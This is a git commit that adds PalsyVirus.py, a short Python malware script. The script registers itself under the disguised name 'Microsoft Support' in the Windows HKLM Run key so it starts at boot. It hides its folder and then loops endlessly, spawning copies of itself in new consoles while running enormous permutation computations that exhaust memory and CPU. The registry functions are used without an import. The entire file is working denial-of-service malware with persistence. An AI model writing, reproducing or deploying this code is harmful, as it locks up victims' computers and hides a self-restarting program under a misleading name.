927ab1029825a9f165ccb6990e4de7211780a2cf
D4Vinci <D4Vinci@users.noreply.github.com>
2016-07-24 00:52:01 +0200

    Create PalsyVirus.py

---
+++ PalsyVirus.py
@@ -0,0 +1,26 @@
+import itertools,subprocess,sys,os
+f =  os.path.basename(sys.argv[0])
+Backdoor_Name=os.path.basename(__file__)
+hiddenPath = os.getcwd()
+hiddenPath = '\"' + hiddenPath + '\"'
+regPath = os.getcwd()
+regPath = regPath + r"\%s"%Backdoor_Name
+regPath = '\"' + regPath + '\"'
+regConnect = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
+regKey = OpenKey(regConnect, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
+SetValueEx(regKey,"Microsoft Support",0, REG_SZ, r"" + regPath)
+os.system("attrib +h " + hiddenPath)
+while True:
+	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
+	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
+	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
+	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
+	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
+	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
+	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
+	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
+	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
+	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
+	subprocess.Popen("%s"%f, creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)
+	[''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz",repeat=100)]
+	[''.join(x for x in t) for t in itertools.product("abcdefghijklmnobqrstuvwxyz",repeat=100)]
